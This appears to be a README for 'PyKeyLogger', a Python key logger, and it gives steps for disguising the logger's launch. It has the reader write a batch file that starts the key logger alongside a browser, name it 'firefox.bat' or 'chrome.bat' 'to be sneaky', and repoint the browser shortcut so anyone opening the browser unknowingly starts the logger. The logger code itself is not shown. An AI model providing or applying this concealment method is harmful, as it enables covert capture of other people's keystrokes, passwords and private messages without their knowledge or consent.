# PyKeyLogger
Simple key logger written in python

To make this script execute with a browser create the following file in the text editor of your choice

===============
@echo
start "" "<path to PyKeyLogger>"
start "" "<path to favorite browser>"

===============

Save this as "launch.bat" or even firefox.bat or chrome.bat if you want to try to be sneaky.
Right click the shortcut of the browser you're targeting and select properties.
Change the "Target" to point to the file path where you saved the batch file you created earlier.
